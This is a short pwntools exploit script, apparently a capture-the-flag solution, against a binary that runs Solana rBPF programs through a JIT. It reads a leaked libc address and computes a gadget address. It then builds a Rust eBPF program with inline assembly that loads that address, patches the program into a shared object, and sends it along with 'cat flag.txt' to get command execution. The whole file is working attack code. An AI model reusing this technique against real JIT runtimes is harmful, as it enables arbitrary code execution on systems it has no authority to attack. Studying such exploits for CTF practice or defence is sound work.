from pwn import *
from patch import patch, load, dump
from subprocess import run

env = {
    "LD_LIBRARY_PATH": "../output",
}
script = """
set breakpoint pending on
set emulate off
b solana_rbpf::jit::JitProgram::invoke::hf85f4a90e8bf15fd
c
nextcall
"""
context.clear(arch='amd64')
context.terminal = ["kitty"]

path = "../output/blockchain"

if args.GDB:
    p = gdb.debug(path, env=env, gdbscript=script)
elif args.HOST and args.PORT:
    p = remote(args.HOST, args.PORT)
else:
    p = process(path, env=env)

p.recvuntil(b"leak: ")
leak = int(p.recvline(), 16)
libcbase = leak - 0x22ad50
gadget = libcbase + 0x105307

log.info(f"leak: 0x{leak:x}")
log.info(f"libcbase: 0x{libcbase:x}")
log.info(f"gadget: 0x{gadget:x}")

src = f"""
#![feature(asm_experimental_arch)]
#![feature(naked_functions)]
#![feature(core_intrinsics)]

use std::arch::asm;

#[no_mangle]
#[naked]
pub unsafe extern "C" fn entrypoint(input: *mut u8) -> u64 {{
    asm! {{
        "add64 r0, r0",
        "add64 r0, r0",
        "xor32 w0, w0",
        "lddw  r0, 0x{gadget:x}",
        "exit",
        options(noreturn),
    }};
}}
"""
dump("src/lib.rs", src.encode())
run("cargo build-bpf", shell=True, check=True)

victim = "target/sbf-solana-solana/release/flag.so"
distance = 0x1690

patch("flag.so", victim, distance)
elf = load("flag.so").ljust(0x10000, b"\x00")
payload = elf + b"cat flag.txt\n\x00"

p.sendafter(b": ", payload)

p.interactive()